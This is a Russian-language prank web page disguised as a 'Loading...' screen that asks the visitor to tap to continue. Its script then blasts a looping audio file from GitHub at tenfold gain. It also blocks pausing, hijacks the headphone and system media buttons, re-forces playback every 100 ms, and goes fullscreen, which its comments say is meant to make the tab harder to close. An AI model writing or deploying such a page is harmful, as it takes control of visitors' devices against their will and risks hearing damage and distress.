<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Загрузка...</title>
    <!-- Ускорение соединения с сервером GitHub -->
    <link rel="preconnect" href="https://raw.githubusercontent.com" crossorigin>
    <link rel="preload" href="https://raw.githubusercontent.com/exterabase/lelouch/main/stonchik.mp3" as="fetch" crossorigin="anonymous">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui, -apple-system, sans-serif;
            cursor: pointer;
            user-select: none;
            -webkit-user-select: none;
            overflow: hidden;
        }
        h1 {
            font-size: 22px;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>

    <h1 id="text">Нажми на экран, чтобы продолжить</h1>

    <!-- Скрытый плеер для мгновенного старта, если буфер еще качается -->
    <audio id="fallbackAudio" src="https://raw.githubusercontent.com/exterabase/lelouch/main/stonchik.mp3" crossorigin="anonymous" preload="auto" loop></audio>

    <script>
        const audioUrl = 'https://raw.githubusercontent.com/exterabase/lelouch/main/stonchik.mp3';
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        const audioCtx = new AudioContext();
        
        let decodedBuffer = null;
        let isPlaying = false;
        const fallbackAudio = document.getElementById('fallbackAudio');
        let mediaSourceConnected = false;

        // 1. Фоновая скачка файла целиком в ОЗУ сразу при входе на сайт
        fetch(audioUrl)
            .then(res => res.arrayBuffer())
            .then(arrayBuffer => audioCtx.decodeAudioData(arrayBuffer))
            .then(buffer => {
                decodedBuffer = buffer;
            })
            .catch(e => console.error(e));

        function blastAudio() {
            // Снимаем блокировку аудиоконтекста в первый же миллисекундный тик тапа
            if (audioCtx.state === 'suspended') {
                audioCtx.resume();
            }

            if (isPlaying) return;
            isPlaying = true;
            document.getElementById('text').innerText = '';

            // Создаем узел экстремального усиления громкости (х10 перегруз)
            const gainNode = audioCtx.createGain();
            gainNode.gain.value = 10.0;
            gainNode.connect(audioCtx.destination);

            if (decodedBuffer) {
                // Вариант А: Файл уже в ОЗУ — старт за 0 мс, паузу поставить физически невозможно
                const source = audioCtx.createBufferSource();
                source.buffer = decodedBuffer;
                source.loop = true;
                source.connect(gainNode);
                source.start(0);
            } else {
                // Вариант Б: Нажали слишком быстро — запускаем предзагруженный поток <audio>
                if (!mediaSourceConnected) {
                    const source = audioCtx.createMediaElementSource(fallbackAudio);
                    source.connect(gainNode);
                    mediaSourceConnected = true;
                }
                fallbackAudio.volume = 1.0;
                fallbackAudio.play().catch(() => {
                    isPlaying = false;
                });

                // Защита от паузы
                fallbackAudio.addEventListener('pause', () => {
                    fallbackAudio.play();
                });
            }

            // 2. Перехват системных кнопок паузы (наушники, шторка на телефоне, кнопки на клавиатуре)
            if ('mediaSession' in navigator) {
                navigator.mediaSession.setActionHandler('pause', () => {
                    if (fallbackAudio.paused && !decodedBuffer) fallbackAudio.play();
                    audioCtx.resume();
                });
                navigator.mediaSession.setActionHandler('stop', () => {
                    if (fallbackAudio.paused && !decodedBuffer) fallbackAudio.play();
                    audioCtx.resume();
                });
            }

            // 3. Таймер-сторож: каждые 100 мс проверяет, не свернули ли контекст, и будит его
            setInterval(() => {
                if (audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }
                if (!decodedBuffer && fallbackAudio.paused) {
                    fallbackAudio.play().catch(() => {});
                }
            }, 100);

            // Полноэкранный режим, чтобы сложнее было закрыть вкладку
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }
        }

        // pointerdown и touchstart срабатывают при касании пальцем ДО того, как палец оторвется от экрана (быстрее, чем click)
        const events = ['pointerdown', 'touchstart', 'mousedown', 'keydown', 'click'];
        events.forEach(evt => {
            window.addEventListener(evt, blastAudio, { passive: true, capture: true });
        });
    </script>
</body>
</html>
